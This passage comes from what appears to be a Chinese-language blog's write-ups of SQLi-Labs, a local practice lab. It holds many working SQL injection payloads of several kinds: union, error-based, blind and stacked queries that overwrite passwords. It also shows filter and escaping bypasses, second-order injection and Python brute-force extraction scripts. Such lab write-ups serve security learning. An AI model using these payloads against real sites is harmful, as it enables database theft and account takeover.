40字符型堆叠盲注这关不会输出报错信息，但还是会输出用户信息，所以只要语句注入成功，再正常查询id即可看到结果测试后发现闭合方式为&#39;): 1http://127.0.0.1/Less-40/?id=1&#x27;)--+ 注入： 1http://127.0.0.1/Less-40/?id=1&#x27;);update users set password=&#x27;hacked22&#x27; where username=&#x27;Dumb&#x27;;--+ Lesson 41数字型堆叠盲注 1http://127.0.0.1/Less-41/?id=1;update users set password=&#x27;hacked33&#x27; where username=&#x27;Dumb&#x27;;--+ Lesson 42POST方法字符型堆叠注入burp抓包注入：通过其他关查看注入结果： Lesson 43POST方法基于错误带括号的字符型注入比Lesson 42闭合方式多个括号查看结果： Lesson 44POST方法基于错误的堆叠盲注除了没有报错，和之前一样：其他关查询： Lesson 45POST方法基于错误带括号的堆叠盲注就比Lesson44多个括号： Lesson 46GET方法基于错误的数字型排序注入这一关开始进入排序注入，提示使用sort参数输入，测试一下： 1http://127.0.0.1/Less-46/?sort=1 1http://127.0.0.1/Less-46/?sort=2 可以看出这里是用sort参数控制第几列进行排序，这里可以基于报错注入，也可以基于盲注： 报错注入看到很多博客都是用的《注入天书》的payload，但其实用基于xmlupdate()的报错注入也可以，而且更加简单一些： 1http://127.0.0.1/Less-46/?sort=1 and updatexml(1,concat(0x7e,database(),0x7e),1) 剩下的部分和之前是一样的注入天书payload： 123456789101112//库名http://127.0.0.1/Less-46/?sort=(select 1 from (select count(*),concat_ws(&#x27;-&#x27;,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)//表名http://127.0.0.1/Less-46/?sort=(select 1 from (select count(*),concat_ws(&#x27;-&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),floor(rand()*2))as a from information_schema.tables group by a) b)//字段名http://127.0.0.1/Less-46/?sort=(select 1 from (select count(*),concat_ws(&#x27;-&#x27;,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),floor(rand()*2))as a from information_schema.tables group by a) b)//数据http://127.0.0.1/Less-46/?sort=(select 1 from (select count(*),concat_ws(&#x27;-&#x27;,(select concat_ws(&#x27;-&#x27;,id,username,password) from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a) b) 布尔盲注 参考：https://www.jianshu.com/p/e3437b562e20 MySQL也是弱类型，它会认为true=1，false=0，用在order by后面会有不同的显示： 1http://127.0.0.1/Less-46/?sort=true 1http://127.0.0.1/Less-46/?sort=false payload： 1http://127.0.0.1/Less-46/?sort=rand((ascii(mid((select schema_name from information_schema.schemata limit 0,1),1,1)))&gt;115) Lesson 47GET方法基于错误的字符型排序注入基于Lesson 46加个单引号闭合就好： 1http://127.0.0.1/Less-47/?sort=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)--+ Lesson 48GET方法基于错误的数字型排序盲注（作者懒狗，图片显示的还是Lesson 47）这一关不再显示报错信息，考虑时间盲注 1http://127.0.0.1/Less-48/?sort=1 and if(substr(database(),1,1)=&#x27;s&#x27;,sleep(1),1) --+ 1http://127.0.0.1/Less-48/?sort=1 and if(substr(database(),1,1)=&#x27;a&#x27;,sleep(1),1) --+ Lesson 49GET方法基于错误的字符型排序盲注基于Lesson 48，使用单引号闭合一下就好 1http://127.0.0.1/Less-49/?sort=1&#x27; and if(substr(database(),1,1)=&#x27;s&#x27;,sleep(1),1) --+ Lesson 50GET方法基于错误的数字型堆叠排序注入将前面学到的结合利用一下就好： 1http://127.0.0.1/Less-50/?sort=1;update users set password=&#x27;hahaha&#x27; where username=&#x27;Dumb&#x27;;--+ Lesson 51GET方法基于错误的字符型堆叠排序注入单引号闭合后即可： 1http://127.0.0.1/Less-51/?sort=1&#x27;;update users set password=&#x27;hahaha111&#x27; where username=&#x27;Dumb&#x27;;--+ Lesson 52GET方法基于错误的数字型堆叠排序盲注直接利用： 1http://127.0.0.1/Less-52/?sort=1;update users set password=&#x27;hahaha222&#x27; where username=&#x27;Dumb&#x27;;--+ Lesson 53GET方法基于错误的字符型堆叠排序盲注加个单引号闭合： 1http://127.0.0.1/Less-53/?sort=1&#x27;;update users set password=&#x27;hahaha333&#x27; where username=&#x27;Dumb&#x27;;--+","categories":[],"tags":[]},{"title":"SQLi-Labs靶场刷题记录【Adv Challenges】","slug":"SQLi-Labs Adv Challenges","date":"2022-11-15T16:00:00.000Z","updated":"2022-11-23T08:22:21.759Z","comments":true,"path":"2022/11/16/SQLi-Labs Adv Challenges/","link":"","permalink":"http://r4x.top/2022/11/16/SQLi-Labs%20Adv%20Challenges/","excerpt":"","text":"Lesson 21Cookie Injection- base64 encoded-single quotes and parenthesis（Cookie 注入 - base64 编码的单引号和括号）今天开始sqli-lab的二阶段，高级注入篇，根据标题，推测思路应该是在Http的cookie字段进行注入，并对payload进行base64编码，不过抓包重放前，还是先随便输入看一下前端的回显：输入admin:admin(username:password)：和前面的题差不多，显示出了Http包中的一些信息，burp抓包：可以在这里看到base64编码后的cookie头，解码后的结果如下：这样思路就有了：构造payload-&gt;base64编码-&gt;重放，根据之前的题目，尝试构造一下updatexml的报错注入： 1admin&#x27;) and updatexml(1,concat(0x7e,database(),0x7e),1) -- (注意最后还有个空格) 编码后： 1YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSwweDdlKSwxKSAtLSA= 重放：可以看到爆出了信息，其余的和之前的类似 Lesson 22Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)根据标题，先尝试将Lesson21的单引号改为双引号： 1admin&quot; and updatexml(1,concat(0x7e,database(),0x7e),1) -- Base64编码： 1YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIC0tIA== 成功：其余与之前类似 Lesson 23GET - Error based - strip comments (基于错误的，过滤注释的GET型)根据标题可以知道肯定是过滤了注释符号，试一下单引号： 1?id=1&#x27; 发现报错，尝试闭合语句： 1?id=1&#x27; and &#x27;1&#x27; =&#x27;1 并没有报错，猜一下列名： 1?id=-1&#x27; union select 1,2,3 and &#x27;1&#x27; =&#x27;1 爆数据库名： 1?id=-1&#x27; union select 1,database(),3 and &#x27;1&#x27; =&#x27;1 表名： 1?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;),3 and &#x27;1&#x27; =&#x27;1 剩下的就和前面一样了，当然这里也可以使用updatexml()报错注入 Lesson 24Second Degree Injections Real treat -Store Injections (二次注入)根据题目，发现考察的是二次注入，有关二次注入的知识，参考这篇文章： http://www.beesfun.com/2017/03/28/MySQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E4%B8%89/ 先看一下修改密码处：发现不能修改，那就注册一个普通账号登上去看看：发现这里可以修改密码，那么思路就有了：注册一个包含危险字符的账号test&#39; #，再登录上这个账号修改密码，此时在源码中的SQL语句就会变成这样： 1$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;test&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; &quot;; 此时相当于直接修改了test用户的密码，而不需要该用户原本的账号，形成了任意用户密码修改的攻击先注册名为test&#39; # 账号：登录：直接输入新密码修改，无需输入当前密码，即可修改test用户的密码： Lesson 25Trick with OR &amp; AND（过滤了OR和AND）打开界面，发现是这样的，简单测试后发现，输入后地下的hint会显示出输入插入进SQL语句的样子： 1http://127.0.0.1/Less-25/?id=1&#x27; oorrder by 1 anandd &#x27;1&#x27;=&#x27;1 回到题目，根据标题可以得知这关过滤了OR和AND，测试后发现只是简单的一层过滤，并没有递归过滤，那么可以按以下的方式绕过： 123oorrder -&gt; orderoorr -&gt; oraandnd -&gt; and 除了这一点，其余与之前的题目没有区别： 1?id=-1&#x27; union select 1,database(),2 --+ Lesson 25aTrick with OR &amp; AND Blind （过滤了or和and的盲注）这一关变成了过滤OR和AND的盲注，也没有用单引号包裹： 1?id=-1 union select 1,database(),2 同时，这关并不会显示错误信息，其余的和之前一样，也可以使用盲注的方法爆数据 Lesson 26Error based - All your SPACES and COMMENTS belong to us 过滤了所有空格和注释符号的报错注入先探测一下闭合方式： 1http://127.0.0.1/Less-26/?id=1&#x27; 单引号闭合，根据题目，应该是过滤了空格和注释符号，常见的绕过思路是使用URL编码绕过空格过滤： 123456%09 TAB 键（水平）%0a 新建一行%0b TAB 键（垂直）%0c 新的一页%0d return 功能%a0 空格 参考：HTML URL 编码参考手册尝试如下payload： 1http://127.0.0.1/Less-26/?id=1&#x27;%a0and&#x27;1&#x27;=&#x27;1 发现还过滤了and:用之前的思路绕过： 1http://127.0.0.1/Less-26/?id=1&#x27;%a0aandnd&#x27;1&#x27;=&#x27;1 构造如下payload： 1http://127.0.0.1/Less-26/?id=0&#x27;%a0union%a0select%a01,database(),2%a0anandd&#x27;1&#x27;=&#x27;1 需要注意的是：之前使用id=-1来使前面的查询语句为false，但如果这关使用id=-1会发现爆不出库名，原因是过滤了注释符号--这里有一种使用and的构造方法：使用||符号，||用来在SQL语句中连接多个字段，用法如下： 1select 1,字段1||字段2...||字段n 那就可以构造这样的payload，以防and被递归过滤的情况： 1http://127.0.0.1/Less-26/?id=0&#x27;%a0union%a0select%a01,database(),2%a0||&#x27;1&#x27;=&#x27;1 后续的步骤与之前类似 报错注入这道题还可以使用基于updatexml()的报错注入： 库名1http://127.0.0.1/Less-26/?id=0&#x27;||updatexml(1,concat(&#x27;^&#x27;,(database())),0)||&#x27;1&#x27;=&#x27;1 表名1http://127.0.0.1/Less-26/?id=0&#x27;||updatexml(1,concat(&#x27;^&#x27;,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=&#x27;security&#x27;)),0)||&#x27;1&#x27;=&#x27;1 需要注意的是：这里还过滤了or，所以information_schema要写为infoorrmation_schema不使用空格的写法： 1http://127.0.0.1/Less-26/?id=0&#x27;||updatexml(1,concat(&#x27;^&#x27;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;security&#x27;))),0)||&#x27;1&#x27;=&#x27;1 剩下的与之前类似，不再赘述 Lesson 26aGET - Blind Based - All your SPACES and COMMENTS belong to us(过滤了空格和注释的盲注)过滤方式和Less-26一样，只是不再输出报错，盲注一下： 1http://127.0.0.1/Less-26a/?id=1&#x27;%a0anandd%a0substr(database(),1,1)=&#x27;s 1http://127.0.0.1/Less-26a/?id=1&#x27;%a0anandd%a0substr(database(),1,1)=&#x27;a 编写脚本爆库名： 12345678910111213141516171819202122232425262728293031import requestsURL = &quot;http://127.0.0.1/Less-26a/&quot;flag = &quot;Your Login name&quot;# 获取数据库名长度def db_len(): for i in range(1,10): payload = &quot;?id=1&#x27;%a0anandd%a0length(database())=\\ &#123;0&#125;%a0anandd%a0&#x27;1&#x27;=&#x27;1&quot;.format(i) r = requests.get(URL + payload) if(flag in r.text): return int(i)# 获取数据库名def db_name(length): name = &quot;&quot; for i in range(1,length+1): for j in range(0,26): char = chr(97+j) payload = &quot;?id=1&#x27;%a0anandd%a0substr(database(),\\ &#123;0&#125;,1)=&#x27;&#123;1&#125;&quot;.format(i,char) r = requests.get(URL + payload) if(flag in r.text): name += char continue return nameif __name__ == &quot;__main__&quot;: print(db_name(db_len())) 输出如下：剩下的简单修改脚本即可 Lesson 27GET - Error Based- All your UNION &amp; SELECT belong to us （过滤了union和select的基于错误的注入）根据题目，过滤了Union和select，利用大小写绕过爆库名： 1http://127.0.0.1/Less-27/?id=0&#x27;%a0UnioN%a0SeLect%a01,database(),2%a0and%a0&#x27;1&#x27;=&#x27;1 其余与前面相同，除了基于正确注入，还可以基于报错注入和Bool盲注 过滤代码123456789101112131415161718$id = blacklist($id);$hint = $id;function blacklist($id)&#123; $id= preg_replace(&#x27;/[\\/\\*]/&#x27;,&quot;&quot;,$id); //strip out /* $id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;,$id); //Strip out --. $id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;,$id); //Strip out #. $id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;,$id); //Strip out spaces. $id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;,$id); //Strip out spaces. $id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;,$id); //Strip out spaces. $id= preg_replace(&#x27;/union/s&#x27;,&quot;&quot;,$id); //Strip out union $id= preg_replace(&#x27;/select/s&#x27;,&quot;&quot;,$id); //Strip out select $id= preg_replace(&#x27;/UNION/s&#x27;,&quot;&quot;,$id); //Strip out UNION $id= preg_replace(&#x27;/SELECT/s&#x27;,&quot;&quot;,$id); //Strip out SELECT $id= preg_replace(&#x27;/Union/s&#x27;,&quot;&quot;,$id); //Strip out Union $id= preg_replace(&#x27;/Select/s&#x27;,&quot;&quot;,$id); //Strip out select return $id;&#125; Lesson 27aGET - Blind Based- All your UNION &amp; SELECT belong to us - Double Quotes （过滤了union和select的盲注）这一关与前面的区别只是将单引号改为了双引号闭合，并且只能盲注，基于26a将过滤的字符大小写绕过一下即可 Lesson 28GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于错误的，有括号的单引号字符型，过滤了union和select等的注入根据题目，闭合方式为单引号有括号，尝试下面的payload： 1http://127.0.0.1/Less-28/?id=1&#x27;);%00 这里使用%00将后面的语句截断爆库名： 1http://127.0.0.1/Less-28/?id=0&#x27;)%a0Union%a0select%a01,database(),3;%00 其余的与之前类似，也可以使用盲注 过滤代码123456789101112$id = blacklist($id);$hint = $id;function blacklist($id)&#123; $id= preg_replace(&#x27;/[\\/\\*]/&#x27;,&quot;&quot;,$id); //strip out /* $id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;,$id); //Strip out --. $id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;,$id); //Strip out #. $id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;,$id); //Strip out spaces. $id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;,$id); //Strip out spaces. $id= preg_replace(&#x27;/union\\s+select/i&#x27;,&quot;&quot;,$id); //Strip out UNION &amp; SELECT. return $id;&#125; Lesson 28a这道题与Less28没有太大区别，只是变成了盲注，过滤条件比上题还松一点 过滤代码1234567891011function blacklist($id)&#123;//$id= preg_replace(&#x27;/[\\/\\*]/&#x27;,&quot;&quot;, $id); //strip out /*//$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id); //Strip out --.//$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id); //Strip out #.//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id); //Strip out spaces.//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id); //Strip out spaces.//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id); //Strip out spaces.$id= preg_replace(&#x27;/union\\s+select/i&#x27;,&quot;&quot;, $id); //Strip out spaces.return $id;&#125; 除了最后一行其他全都过滤掉了 Lesson 29Lesson29-31这几关主要涉及的是两层服务器的情况，题目并不困难，问题是Tomcat环境的配置，我是用docker跑的sqli-labs，主要参考这篇文章进行配置，博主讲的很详细，我不再赘述需要注意的是，如果和我一样使用docker搭建环境，那需要重新开一个容器，并添加容器内8080端口和80端口的映射，环境配置好之后还需要修改index.jsp文件，因为我是基于acgpiano/sqli-labs这个镜像配置的，所以和默认的index.jsp中链接路径有所不同回到题目：使用一个参数注入： 1http://localhost:12345/sqli-labs/Less-29/index.jsp?id=1&#x27; 就会触发WAF，这是因为Tomcat服务器解析了这个参数并返回，关于服务器的两层架构，参考这篇文章这里的中间服务器是Tomcat，所以Tomcat会解析第一个参数，然后Tomcat去请求apache，apache会解析最后一个参数，而最后返回的参数也是apache处理的参数，如： 1http://localhost:12345/sqli-labs/Less-29/index.jsp?id=1&amp;id=2 这样我们就可以使用第二个参数进行注入： 1http://localhost:12345/sqli-labs/Less-29/index.jsp?id=1&amp;id=2&#x27; 报错，剩下的就很简单了，因为本题主要考察的是参数污染，所以注入部分参考之前的就可以 Lesson 30~31Lesson 29的盲注版本和带括号版本，除此之外和Lesson 29一模一样，不再赘述 Lesson 32GET - Bypass custom filter adding slashes to dangerous chars 对危险字符添加反斜线过滤本题考察宽字节注入，相关知识参考：https://zgao.top/mysql%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/加个单引号先测试一波： 1http://127.0.0.1/Less-32/?id=1&#x27; 发现后端将单引号加了反斜线，直接使用%df绕过： 1http://127.0.0.1/Less-32/?id=0%df&#x27;union select 1,database(),2--+ 成功绕过，这里使用注入%df后，由于反斜杠编码后是%5c，所以参数传入代码层后会变为%df%5c%27，而mysql在解析%df%5c 时会将其看作一个宽字节，它认为两个字节就是GBK编码表示的汉字，这里是“運”，从而使反斜线失去了效果，这里只要第一个字节大于128即可后续注入与前面一样，不再赘述 Lesson 33基于错误_GET_单引号_字符型_addslashes()_宽字节注入这一关使用了addslashes()函数进行过滤，其在特定的字符前加入反斜杠进行转义： 1234单引号 &#x27;双引号 &quot;反斜杠 \\空字符 NULL 其余与Lesson32完全相同 Lesson 34基于POST方法的反斜线Bypass本题考察问题和Less-33一致，同样可以使用宽字节注入，只是参数提交方法变为了POST，burp抓包重放即可，这里使用报错注入： Lesson 35基于错误的GET型，数字型宽字节注入既然是数字型，那不需要单引号来闭合，直接就可以利用： 1http://127.0.0.1/Less-35/?id=-1 union select 1,database(),3 --+ Lesson 36基于错误的GET型，单引号字符型，mysql-real-escape-string()宽字节注入 mysql-real-escape-string()函数这关使用mysql-real-escape-string()函数进行过滤，其作用是转义SQL语句中使用的字符串中的特殊字符： 1234567\\x00\\n\\r\\&#x27;&quot;\\x1a 语法1mysql_real_escape_string(_string_,_connection_) 参数 描述 string 必需。规定要转义的字符串。 connection 可选。规定 MySQL 连接。如果未规定，则使用上一个连接。 这个函数也可以直接使用宽字节注入： 1http://127.0.0.1/Less-36/?id=0%df&#x27;union select 1,database(),2 --+ Lesson 37Lesson 36的POST版本","categories":[],"tags":[]},{"title":"SQLi-Labs靶场刷题记录【Basic Challenges】","slug":"SQLi-Labs Basic Challenges","date":"2022-10-22T16:00:00.000Z","updated":"2022-11-23T08:22:10.133Z","comments":true,"path":"2022/10/23/SQLi-Labs Basic Challenges/","link":"","permalink":"http://r4x.top/2022/10/23/SQLi-Labs%20Basic%20Challenges/","excerpt":"","text":"Lesson 1GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入提示用参数名为id，值为数字，尝试一下： 1http://127.0.0.1/Less-1/?id=1 显示了用户名和密码，测试后发现共有14条数据。 【1】查列数1http://127.0.0.1/Less-1/?id=1&#x27; order by 3 --+ 1http://127.0.0.1/Less-1/?id=1&#x27; order by 4 --+ 到第四列时报错，共有三列数据 【2】查库名1http://127.0.0.1/Less-1/?id=?id=-1&#x27; union select 3,database(),database(); --+ 要注意的两个点： id必须为-1，或任何表中不存在的id，因为如果存在的话，name和password处就会显示该表中该id对应的数据，后面联合查询到的数据不会被显示出来 联合查询会将查出来的数据与原来查询出的数据并列，所以联合查询的条数要等于原表中的列数，否则会报错，这里查询出来大约是如下的样子：123456+----+--------------+---------------------------+| id | name | url | +----+--------------+---------------------------+| -1 | | || 3 | security | security |+----+--------------+---------------------------+ 【3】获取所有表1http://127.0.0.1/Less-1/?id=?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+ GROUP_CONCAT()：将group by产生的同一个分组中的值连接起来，返回一个字符串结果 information_schema.tables各字段说明： 字段 含义 Table_catalog 数据表登记目录 Table_schema 数据表所属的数据库名 Table_name 表名称 Table_type 表类型[system view|base table] Engine 使用的数据库引擎[MyISAM|CSV|InnoDB] Version 版本，默认值10 Row_format 行格式[Compact|Dynamic|Fixed] Table_rows 表里所存多少行数据 Avg_row_length 平均行长度 Data_length 数据长度 Max_data_length 最大数据长度 Index_length 索引长度 Data_free 空间碎片 Auto_increment 做自增主键的自动增量当前值 Create_time 表的创建时间 Update_time 表的更新时间 Check_time 表的检查时间 Table_collation 表的字符校验编码集 Checksum 校验和 Create_options 创建选项 Table_comment 表的注释、备注 【4】查询字段1http://127.0.0.1/Less-1/?id=?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+ 字段 含义 table_schema&nbsp; 表所有者（对于schema的名称） table_name&nbsp; 表名 column_name&nbsp; 列名 ordinal_position&nbsp; 列标识号 column_default&nbsp; 列的默认值 is_nullable&nbsp; 列的为空性。如果列允许 null，那么该列返回 yes。否则，返回 no data_type&nbsp; 系统提供的数据类型 character_maximum_length 以字符为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 null。有关更多信息，请参见数据类型 character_octet_length&nbsp; 以字节为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 nu numeric_precision&nbsp; 近似数字数据、精确数字数据、整型数据或货币数据的精度。否则，返回 null numeric_precision_radix&nbsp; 近似数字数据、精确数字数据、整型数据或货币数据的精度基数。否则，返回 null numeric_scale&nbsp; 近似数字数据、精确数字数据、整数数据或货币数据的小数位数。否则，返回 null datetime_precision&nbsp; datetime 及 sql-92 interval 数据类型的子类型代码。对于其它数据类型，返回 null character_set_catalog&nbsp; 如果列是字符数据或 text 数据类型，那么返回 master，指明字符集所在的数据库。否则，返回 null character_set_schema&nbsp; 如果列是字符数据或 text 数据类型，那么返回 dbo，指明字符集的所有者名称。否则，返回 null character_set_name&nbsp; 如果该列是字符数据或 text 数据类型，那么为字符集返回唯一的名称。否则，返回 null collation_catalog&nbsp; 如果列是字符数据或 text 数据类型，那么返回 master，指明在其中定义排序次序的数据库。否则此列为 null collation_schema&nbsp; 返回 dbo，为字符数据或 text 数据类型指明排序次序的所有者。否则，返回 null collation_name&nbsp; 如果列是字符数据或 text 数据类型，那么为排序次序返回唯一的名称。否则，返回 null。 domain_catalog&nbsp; 如果列是一种用户定义数据类型，那么该列是某个数据库名称，在该数据库名中创建了这种用户定义数据类型。否则，返回 null domain_schema&nbsp; 如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的创建者。否则，返回 null domain_name&nbsp; 如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的名称。否则，返回 NULL 【5】查询用户名和密码1http://127.0.0.1/Less-1/?id=?id=-1&#x27; union select 1,2,group_concat(username) from security.users --+ 1http://127.0.0.1/Less-1/?id=?id=-1&#x27; union select 1,2,group_concat(password) from security.users --+ Lesson 2GET - Error based - Intiger based (基于错误的GET整型注入) 【1】查列数1http://127.0.0.1/Less-2/?id=1 and 1=1 --+ 1http://127.0.0.1/Less-2/?id=1 and 1=1 order by 3 --+ 列数为4 【2】查库名1http://127.0.0.1/Less-2/?id=-1 union select 1,2,database(); --+ 【3】获取所有表1http://127.0.0.1/Less-2/?id=1 and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+ 【4】查询字段1http://127.0.0.1/Less-2/?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+ 【5】查询用户名和密码1http://127.0.0.1/Less-2/?id=-1 union select 1,2,group_concat(username) from security.users --+ 1http://127.0.0.1/Less-2/?id=-1 union select 1,2,group_concat(password) from security.users --+ Lesson 3GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)尝试用单引号： 1http://127.0.0.1/Less-3/?id=-1 &#x27; union select 1,2,3 --+ 报错了，发现是因为括号没有闭合，那就闭合一下再试一试： 1http://127.0.0.1/Less-3/?id=-1&#x27; ) union select 1,2,3 --+ 注入正常，列数与前面相同，直接查库名： 1http://127.0.0.1/Less-3/?id=-1&#x27; ) union select 1,database(),3 --+ 查表名： 1http://127.0.0.1/Less-3/?id=-1&#x27; ) union select 1,3,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+ 查字段： 1http://127.0.0.1/Less-3/?id=-1&#x27; ) union select 1,3,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; --+ 查数据： 12//usernamehttp://127.0.0.1/Less-3/?id=-1&#x27; ) union select 1,3,group_concat(username) from security.users --+ 12//passwordhttp://127.0.0.1/Less-3/?id=-1&#x27; ) union select 1,3,group_concat(password) from security.users --+ 源码123$sql=&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); 可以看到这里的$id是单引号和括号同时包裹起来的，所以payload中不仅要闭合单引号，还要闭合一个左括号，其他的和之前的题目一样 Lesson 4Error based - Double Quotes - String （基于错误的GET双引号字符型注入）看标题是基于双引号的，尝试一下： 1http://127.0.0.1/Less-4/?id=-1&quot; union select 1,2,3 --+ 发现还有个括号，加个括号： 1http://127.0.0.1/Less-4/?id=-1&quot;) union select 1,2,3 --+ 剩下的就和前面的一样了，不再赘述 源码1234$id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;;$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); Lesson 5GET - Double Injection - Single Quotes - String (双注入GET单引号字符型注入)正常输入看一下回显： 1http://127.0.0.1/Less-5/?id=1 与前几题不通，开始不显示具体信息了，可以判断是盲注，只能通过返回的状态来判断payload中注入的语句是否正确，尝试查一下列数： 1http://127.0.0.1/Less-5/?id=1&#x27; order by 4 --+ 有报错，列数为3，接下来查库名，因为是盲注，所以不能指望会显示出返回的信息，只能根据bool型的注入语句看有无回显来猜测库名。首先猜测库名的长度，构造下面的语句： 1http://127.0.0.1/Less-5/?id=1&#x27; and length(database())=1--+ 一直枚举到8出现回显，说明库名长度为8 1http://127.0.0.1/Less-5/?id=1&#x27; and substring(database(),1,1)=&#x27;a&#x27;--+ 发现没有显示信息，再尝试以下payload：尝试暴库名： 1http://127.0.0.1/Less-5/?id=1&#x27; and substring(database(),1,1)=&#x27;s&#x27;--+ 显示了，说明库名的第一个字符为s直接写脚本暴库名： 123456789101112131415161718192021222324252627282930import requestsURL = &quot;http://127.0.0.1/Less-5/&quot;# 获取数据库名长度def db_len(): for i in range(1,10): payload = &quot;?id=1&#x27; and length(database())=&#123;0&#125;--+&quot;.format(i) r = requests.get(URL + payload) if(r.headers[&#x27;Content-Length&#x27;])!=&#x27;436&#x27;: return int(i)# 获取数据库名def db_name(length): name = &quot;&quot; for i in range(1,length+1): for j in range(0,26): char = chr(97+j) payload = &quot;?id=1&#x27; and substring(database(),&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27;--+&quot;.format(i,char) r = requests.get(URL + payload) if(r.headers[&#x27;Content-Length&#x27;])!=&#x27;436&#x27;: name += char continue return namedef main(): print(db_name(db_len()))main() 执行结果如下：表名 1http://127.0.0.1/Less-5/?id=1&#x27; and if((substring((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),1,1)=&#x27;e&#x27;),1,0) --+ 列名： 1http://127.0.0.1/Less-5/?id=1&#x27; and if((substring((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),1,1)=&#x27;i&#x27;),1,0) --+ 用户名： 1http://127.0.0.1/Less-5/?id=1&#x27; and if((substring((select group_concat(username) from security.users),1,1)=&#x27;D&#x27;),1,0) --+ 密码： 1http://127.0.0.1/Less-5/?id=1&#x27; and if((substring((select group_concat(password) from security.users),1,1)=&#x27;D&#x27;),1,0) --+ 表名和列名和数据使用以上对应的payload简单修改程序就可以爆破出来 xmlupdate报错注入思路暴库名： 1http://127.0.0.1/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) --+ 暴内容： 1http://127.0.0.1/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,(substr((select group_concat(username,0x5e,password) from users),1)),0x7e),1) --+ 这里并没有显示完整，问题是报错信息一次只能显示31个字符，将substr里的启示位置每次增加31，就可以将完整的数据暴出来 12345678910111213141516171819import requestsfrom lxml import etreeURL = &quot;http://127.0.0.1/Less-5/&quot;def main(): for i in range (0,100): payload = &quot;?id=1&#x27; and updatexml(1,concat(0x7e,(substr((select\\ group_concat(username,0x5e,password) from users),&#123;0&#125;)),\\ 0x7e),1) --+&quot;.format(1+i*31) r = requests.get(URL+payload) if r.headers[&#x27;Content-Length&#x27;]==&#x27;459&#x27;:break html = etree.HTML(r.text) result = html.xpath(&#x27;/html/body/div/font[2]/font[1]/text()&#x27;) print(result)main() 结果如下： 源码12345678910111213141516171819&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);// take the variablesif(isset($_GET[&#x27;id&#x27;]))&#123;$id=$_GET[&#x27;id&#x27;];//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\\n&quot;);fclose($fp);// connectivity $sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); Lesson 6Double Injection - Double Quotes - String (双注入GET双引号字符型注入)除了单引号变为双引号，与第五关没有区别，改一下Lesson5的程序就可以利用了 源码：12345678910111213141516171819&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);// take the variablesif(isset($_GET[&#x27;id&#x27;]))&#123;$id=$_GET[&#x27;id&#x27;];//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\\n&quot;);fclose($fp);// connectivity $id = 